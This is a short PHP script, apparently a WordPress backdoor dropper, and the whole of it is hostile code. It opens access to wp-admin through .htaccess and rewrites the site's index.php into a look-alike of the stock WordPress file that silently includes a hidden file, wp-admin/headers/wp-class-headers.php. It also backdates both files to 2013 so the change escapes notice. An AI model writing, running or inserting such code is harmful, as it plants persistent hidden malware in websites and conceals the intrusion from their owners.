<?php

// Creating wp-admin/.htaccess

$file_data_htaccess ="allow from all";
$htaccess = $_SERVER['DOCUMENT_ROOT'].'/wp-admin/.htaccess';
echo"<br>---------------------------- Create wp-admin/.htaccess ---------------------------------<br><br>";
if (file_put_contents($htaccess, $file_data_htaccess)) {
	echo"Proceeded: ".$htaccess." > Succesfull<br>";
	touch($htaccess, mktime(12, 17, 11, 12, 31, 2013));
} else {
	echo"Proceeded: ".$htaccess." > Error!<br>";
}
// Re-creating Index.php

// Creating INDEX.PHP (SED Include)

$index = $_SERVER['DOCUMENT_ROOT'].'/index.php';
$file_data_headers ="<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */
include \"./wp-admin/headers/wp-class-headers.php\";
/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );";

echo"<br>---------------------------- Re-Include index.php (SED Include) ---------------------------------<br><br>";
if (file_put_contents($index, str_replace("#", "$", $file_data_headers))) {
touch($index, mktime(12, 17, 11, 12, 31, 2013));
	echo"Proceeded: ".$index." > Succesfull<br>";
} else {
	echo"Proceeded: ".$index." > Error!<br>";
}

?>